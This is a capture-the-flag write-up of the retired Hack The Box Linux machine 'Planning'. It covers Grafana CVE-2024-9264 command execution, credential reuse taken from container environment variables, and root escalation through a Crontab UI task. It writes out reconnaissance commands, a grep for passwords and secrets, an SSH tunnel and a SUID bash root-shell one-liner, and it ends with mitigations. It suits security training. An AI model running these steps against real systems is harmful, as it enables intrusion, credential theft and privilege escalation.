---
machine: Planning
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, grafana, cve-2024-9264, docker, credential-reuse, crontab-ui]
---

# Planning — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A subdomain exposes Grafana 11.0.0 with administrator credentials. CVE-2024-9264 executes commands through SQL Expressions and DuckDB. The container leaks a host user's password; reuse allows SSH, and a local Crontab UI running as root completes the escalation.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,80 <IP>
```

- SSH and nginx.
- The base domain is `planning.htb`.
- Vhost enumeration discovers `grafana.planning.htb`.

```bash
ffuf -u http://planning.htb -H 'Host: FUZZ.planning.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 178
```

## Enumeration

- Grafana shows version 11.0.0 in the footer.
- The prompt provides administrator credentials; they are used only against the instance.
- The version predates the CVE-2024-9264 fix, an injection in SQL Expressions.

## Foothold

The query reaches DuckDB and can load the `shellfs` extension, which executes system commands. An authenticated request to `/api/ds/query` writes a script and runs it.

```bash
curl -s -b cookies.txt -H 'Content-Type: application/json' \
  -X POST http://grafana.planning.htb/api/ds/query \
  --data @query.json
```

The command runs as root inside the Grafana container. A reverse shell confirms the context with `id`.

## Lateral movement

The container environment includes `GF_SECURITY_ADMIN_USER=enzo` and a password. The same password works for SSH on the host.

```bash
env | grep -i -E 'admin|password|secret'
ssh enzo@planning.htb
```

## Privilege escalation

`ps aux` and `ss -lntp` show a Crontab UI listening on `127.0.0.1:8000`. The port is forwarded and the panel is accessed; it runs as root.

```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb -N
```

A scheduled task copies `/bin/bash` and sets SUID. When root runs it, `enzo` gets an effective root shell.

```bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
/tmp/rootbash -p
```

## Evidence

- `id` output in the container and on the host.
- Environment variables with redacted values.
- Crontab UI and the created task.
- Redacted flag.

## Lessons learned

- A version string in an application footer is still a valid lead.
- Container environment secrets may be reused on the host.
- Admin panels bound to `localhost` are not out of reach: an SSH tunnel reaches them.

## Mitigations and detection

- Update Grafana to a fixed release and restrict SQL Expressions.
- Do not run Grafana as root or reuse credentials between container and host.
- Require authentication for Crontab UI and bind it to an administrative interface only.
- Audit cron creation and the appearance of SUID binaries.

## References

- <https://www.hackthebox.com/machines/Planning>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-9264>
- <https://grafana.com/security/security-advisories/cve-2024-9264/>
- <https://attack.mitre.org/techniques/T1190/>
